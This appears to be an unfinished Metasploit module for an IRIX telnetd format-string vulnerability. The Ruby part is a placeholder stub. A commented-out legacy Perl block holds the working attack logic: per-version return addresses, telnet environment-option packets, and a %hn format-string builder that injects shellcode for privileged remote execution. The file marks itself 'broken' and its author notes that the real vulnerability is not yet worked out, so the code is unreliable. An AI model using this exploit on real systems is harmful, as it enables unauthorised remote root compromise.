require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Irix Telnet Environment Format String',
			'Description'    => %q{
				Based on irxtelnetd.c
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 64,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'irix',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::irix_telnetd_envfmt;
use base "Msf::Exploit";
use IO::Socket;
use IO::Select;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
    'Name'  => 'Irix Telnet Environment Format String', # XXX - figure out the real vuln
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>'],
    'Arch'  => [ 'mips' ],
    'OS'    => [ 'irix' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The telnet server port', 23],
                   },
    'Payload' => {
        'Space'      => 64,
        'MinNops'    => 0,
    },
    
    'Description'  => Pex::Text::Freeform(qq{
            Based on irxtelnetd.c
    }),
    'Keys'  => ['inetd'],
    'Refs'  =>  [  
                  
                ],
    'DefaultTarget' => 0,
    'Targets' =>
    [
        [ "Bruteforce" ],
        [ "Irix 6.2  libc.so.1: no patches      telnetd: no patches",           0, 0x56, 0x0fb44390, 115, 0x7fc4d1e0, 0x14 ],
        [ "Irix 6.2  libc.so.1: 1918|2086       telnetd: no patches",           0, 0x56, 0x0fb483b0, 117, 0x7fc4d1e0, 0x14 ],
        [ "Irix 6.2  libc.so.1: 3490|3723|3771  telnetd: no patches",           0, 0x56, 0x0fb50490, 122, 0x7fc4d1e0, 0x14 ],
        [ "Irix 6.2  libc.so.1: no patches      telnetd: 1485|2070|3117|3414",  0, 0x56, 0x0fb44390, 115, 0x7fc4d220, 0x14 ],
        [ "Irix 6.2  libc.so.1: 1918|2086       telnetd: 1485|2070|3117|3414",  0, 0x56, 0x0fb483b0, 117, 0x7fc4d220, 0x14 ],
        [ "Irix 6.2  libc.so.1: 3490|3723|3771  telnetd: 1485|2070|3117|3414",  0, 0x56, 0x0fb50490, 122, 0x7fc4d220, 0x14 ],
        [ "Irix 6.3  libc.so.1: no patches      telnetd: no patches",           0, 0x56, 0x0fb4fce0, 104, 0x7fc4d230, 0x14 ],
        [ "Irix 6.3  libc.so.1: 2087            telnetd: no patches",           0, 0x56, 0x0fb4f690, 104, 0x7fc4d230, 0x14 ],
        [ "Irix 6.3  libc.so.1: 3535|3737|3770  telnetd: no patches",           0, 0x56, 0x0fb52900, 104, 0x7fc4d230, 0x14 ],
        [ "Irix 6.4  libc.so.1: no patches      telnetd: no patches",           1, 0x5e, 0x0fb576d8,  88, 0x7fc4cf70, 0x1c ],
        [ "Irix 6.4  libc.so.1: 3491|3769|3738  telnetd: no patches",           1, 0x5e, 0x0fb4d6dc, 102, 0x7fc4cf70, 0x1c ],
        [ "Irix 6.5-6.5.8m 6.5-6.5.7f           telnetd: no patches",           1, 0x5e, 0x7fc496e8,  77, 0x7fc4cf98, 0x1c ],
        [ "Irix 6.5.8f                          telnetd: no patches",           1, 0x5e, 0x7fc496e0,  77, 0x7fc4cf98, 0x1c ],
    ],
    'Keys' => ['broken'],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_path = $self->GetVar('RPATH');

    my $shellcode   = $self->GetVar('EncodedPayload')->RawPayload;
    my $target_idx  = $self->GetVar('TARGET');
    my @targets;
    my @offsets;
    my $pad;

    if ($target_idx == 0) {
        @targets = @{$self->Targets};
        shift(@targets);
    } else {
        @targets = $self->Targets->[ $target_idx ];
    }
                
    foreach my $target (@targets) {
        
        $self->PrintLine("[*] Trying target $target->[0]");
        my $s = Msf::Socket::Tcp->new
        (
            'PeerAddr'  => $target_host, 
            'PeerPort'  => $target_port, 
            'LocalPort' => $self->GetVar('CPORT'),
            'SSL'       => $self->GetVar('SSL'),
        );
        if ($s->IsError) {
          $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
          return;
        }
 
        my $prep = $self->CreateEnv($target, $shellcode);       
        my $envA = "\xff\xfa\x24\x00\x01\x58\x58\x58\x58\x00".$prep."\xff\xf0";
        my $envB = "\xff\xfa\x24\x00\x01\x5f\x52\x4c\x44\x00".$prep."\xff\xf0";

        $s->Send($envA);
        select(undef, undef, undef, 0.25);
        $s->Send($envB);
        
        $self->Handler($s);
    }
    return;
}


sub CreateEnv {
    my $self = shift;
    my $targ = shift;
    my $code = shift;
    my $res;
    
    my $pch = $targ->[3] + ($targ->[4] * 4);
    my $adr = $targ->[5] + $targ->[6];
    my $adrh = ($adr >> 16) - $targ->[2];
    my $adrl = 0x10000 - ($adrh & 0xffff) + ($adr & 0xffff) - $targ->[2];
    
    printf("target: ");
    foreach (@{$targ}) {
        printf("0x%.8x ", $_);
    }
    print "\n";
    
    printf("pch: 0x%.8x\n", $pch);
    printf("adr: 0x%.8x\n", $adr);
    printf("adrh: 0x%.8x\n", $adrh);
    printf("adrl: 0x%.8x\n", $adrl);        
        
    if (! $targ->[1]) { 
        $res .= " ";
        $res .= pack('N', $pch);
        $res .= pack('N', $pch+2);
        $res .= "   ";
        foreach my $c (split(//, $code)) {
            $res .= $c;
            if ($c eq "\x02" || $c eq "\xff") {
                $res .= $c;
            }
        }
        $res .= sprintf("%%%05dc%%22\$hn%%%05dc%%23\$hn", $adrh, $adrl);    
    } else {
        $res .= " " x 5;
        $res .= pack('N', $pch);
        $res .= " " x 4;
        $res .= pack('N', $pch+2);
        $res .= " " x 3;
        foreach my $c (split(//, $code)) {
            $res .= $c;
            if ($c eq "\x02" || $c eq "\xff") {
                $res .= $c;
            }
        }
        $res .= sprintf("%%%05dc%%22\$hn%%%05dc%%23\$hn", $adrh, $adrl); 
    }
    return $res;
}



1;

=end


end
end	
